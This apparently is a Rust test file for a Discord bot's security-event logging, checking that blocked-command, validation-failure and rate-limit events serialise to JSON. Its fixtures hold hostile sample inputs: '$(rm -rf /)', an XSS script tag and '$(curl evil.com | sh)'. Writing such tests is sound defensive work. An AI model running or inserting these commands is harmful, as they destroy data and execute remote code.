use crate::discord::spiral_constellation_bot::{IntentClassification, SecurityEvent};
use std::collections::HashMap;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_command_blocked_event_serialization() {
        let event = SecurityEvent::CommandBlocked {
            timestamp: "2024-01-01T12:00:00Z".to_string(),
            user_id: 123456789,
            username: "testuser".to_string(),
            channel_id: 987654321,
            guild_id: Some(555555555),
            message_id: 111111111,
            content: "!admin $(rm -rf /)".to_string(),
            validation_issues: vec![
                "Contains dangerous command characters".to_string(),
                "Contains dangerous command keywords".to_string(),
            ],
            risk_level: "Critical".to_string(),
            intent_classification: Some(IntentClassification {
                intent_type: "SystemCommand".to_string(),
                confidence: 0.85,
                risk_level: "Critical".to_string(),
                parameters: HashMap::new(),
            }),
        };

        let json = event.to_json();
        let parsed: serde_json::Value = serde_json::from_str(&json).expect("Invalid JSON");

        assert_eq!(parsed["event_type"], "CommandBlocked");
        assert_eq!(parsed["user_id"], 123456789);
        assert_eq!(parsed["username"], "testuser");
        assert_eq!(parsed["content"], "!admin $(rm -rf /)");
        assert_eq!(parsed["risk_level"], "Critical");
        assert!(parsed["validation_issues"].is_array());
        assert_eq!(parsed["validation_issues"].as_array().unwrap().len(), 2);
        assert!(parsed["intent_classification"].is_object());
        assert_eq!(
            parsed["intent_classification"]["intent_type"],
            "SystemCommand"
        );
        assert_eq!(parsed["intent_classification"]["confidence"], 0.85);
    }

    #[test]
    fn test_security_validation_failed_event() {
        let event = SecurityEvent::SecurityValidationFailed {
            timestamp: "2024-01-01T12:00:00Z".to_string(),
            user_id: 123456789,
            username: "testuser".to_string(),
            channel_id: 987654321,
            guild_id: None,
            message_id: 111111111,
            content: "<script>alert('xss')</script>".to_string(),
            validation_issues: vec![
                "Potential XSS attempt detected".to_string(),
                "Contains script tags".to_string(),
            ],
            risk_level: "High".to_string(),
            validation_type: "message_security".to_string(),
        };

        let json = event.to_json();
        let parsed: serde_json::Value = serde_json::from_str(&json).expect("Invalid JSON");

        assert_eq!(parsed["event_type"], "SecurityValidationFailed");
        assert_eq!(parsed["validation_type"], "message_security");
        assert_eq!(parsed["risk_level"], "High");
        assert!(parsed["guild_id"].is_null());
        assert_eq!(parsed["content"], "<script>alert('xss')</script>");
    }

    #[test]
    fn test_rate_limit_exceeded_event() {
        let event = SecurityEvent::RateLimitExceeded {
            timestamp: "2024-01-01T12:00:00Z".to_string(),
            user_id: 123456789,
            username: "spammer".to_string(),
            remaining_messages: 0,
        };

        let json = event.to_json();
        let parsed: serde_json::Value = serde_json::from_str(&json).expect("Invalid JSON");

        assert_eq!(parsed["event_type"], "RateLimitExceeded");
        assert_eq!(parsed["user_id"], 123456789);
        assert_eq!(parsed["username"], "spammer");
        assert_eq!(parsed["remaining_messages"], 0);
    }

    #[test]
    fn test_intent_classification_serialization() {
        let mut parameters = HashMap::new();
        parameters.insert("language".to_string(), "rust".to_string());
        parameters.insert("action".to_string(), "create_function".to_string());

        let classification = IntentClassification {
            intent_type: "CodeGeneration".to_string(),
            confidence: 0.95,
            risk_level: "Low".to_string(),
            parameters,
        };

        let json = serde_json::to_string(&classification).expect("Serialization failed");
        let parsed: serde_json::Value = serde_json::from_str(&json).expect("Invalid JSON");

        assert_eq!(parsed["intent_type"], "CodeGeneration");
        assert_eq!(parsed["confidence"], 0.95);
        assert_eq!(parsed["risk_level"], "Low");
        assert_eq!(parsed["parameters"]["language"], "rust");
        assert_eq!(parsed["parameters"]["action"], "create_function");
    }

    #[test]
    fn test_security_event_with_no_intent_classification() {
        let event = SecurityEvent::CommandBlocked {
            timestamp: "2024-01-01T12:00:00Z".to_string(),
            user_id: 123456789,
            username: "testuser".to_string(),
            channel_id: 987654321,
            guild_id: Some(555555555),
            message_id: 111111111,
            content: "suspicious content".to_string(),
            validation_issues: vec!["Unknown security issue".to_string()],
            risk_level: "Medium".to_string(),
            intent_classification: None,
        };

        let json = event.to_json();
        let parsed: serde_json::Value = serde_json::from_str(&json).expect("Invalid JSON");

        assert_eq!(parsed["event_type"], "CommandBlocked");
        assert!(parsed["intent_classification"].is_null());
    }

    #[test]
    fn test_multiple_validation_issues() {
        let event = SecurityEvent::CommandBlocked {
            timestamp: "2024-01-01T12:00:00Z".to_string(),
            user_id: 123456789,
            username: "testuser".to_string(),
            channel_id: 987654321,
            guild_id: Some(555555555),
            message_id: 111111111,
            content: "$(curl evil.com | sh)".to_string(),
            validation_issues: vec![
                "Contains dangerous command characters".to_string(),
                "Contains dangerous command keywords".to_string(),
                "Potential remote code execution".to_string(),
                "Contains URL patterns".to_string(),
            ],
            risk_level: "Critical".to_string(),
            intent_classification: Some(IntentClassification {
                intent_type: "Malicious".to_string(),
                confidence: 0.99,
                risk_level: "Critical".to_string(),
                parameters: HashMap::new(),
            }),
        };

        let json = event.to_json();
        let parsed: serde_json::Value = serde_json::from_str(&json).expect("Invalid JSON");

        let issues = parsed["validation_issues"].as_array().unwrap();
        assert_eq!(issues.len(), 4);
        assert!(issues.contains(&serde_json::Value::String(
            "Contains dangerous command characters".to_string()
        )));
        assert!(issues.contains(&serde_json::Value::String(
            "Potential remote code execution".to_string()
        )));
    }

    #[test]
    fn test_jsonl_format_compatibility() {
        // Test that multiple events can be serialized as JSONL (one JSON per line)
        let events = vec![
            SecurityEvent::CommandBlocked {
                timestamp: "2024-01-01T12:00:00Z".to_string(),
                user_id: 123456789,
                username: "user1".to_string(),
                channel_id: 987654321,
                guild_id: Some(555555555),
                message_id: 111111111,
                content: "blocked command 1".to_string(),
                validation_issues: vec!["Issue 1".to_string()],
                risk_level: "High".to_string(),
                intent_classification: None,
            },
            SecurityEvent::RateLimitExceeded {
                timestamp: "2024-01-01T12:00:01Z".to_string(),
                user_id: 987654321,
                username: "user2".to_string(),
                remaining_messages: 0,
            },
            SecurityEvent::SecurityValidationFailed {
                timestamp: "2024-01-01T12:00:02Z".to_string(),
                user_id: 111222333,
                username: "user3".to_string(),
                channel_id: 444555666,
                guild_id: None,
                message_id: 777888999,
                content: "malicious content".to_string(),
                validation_issues: vec!["XSS attempt".to_string()],
                risk_level: "Critical".to_string(),
                validation_type: "content_filter".to_string(),
            },
        ];

        let mut jsonl_output = String::new();
        for event in &events {
            jsonl_output.push_str(&event.to_json());
            jsonl_output.push('\n');
        }

        // Verify each line is valid JSON
        for (i, line) in jsonl_output.lines().enumerate() {
            if !line.is_empty() {
                let parsed: serde_json::Value = serde_json::from_str(line)
                    .unwrap_or_else(|_| panic!("Line {i} is not valid JSON"));
                assert!(parsed["event_type"].is_string());
                assert!(parsed["timestamp"].is_string());
                assert!(parsed["user_id"].is_number());
            }
        }
    }
}
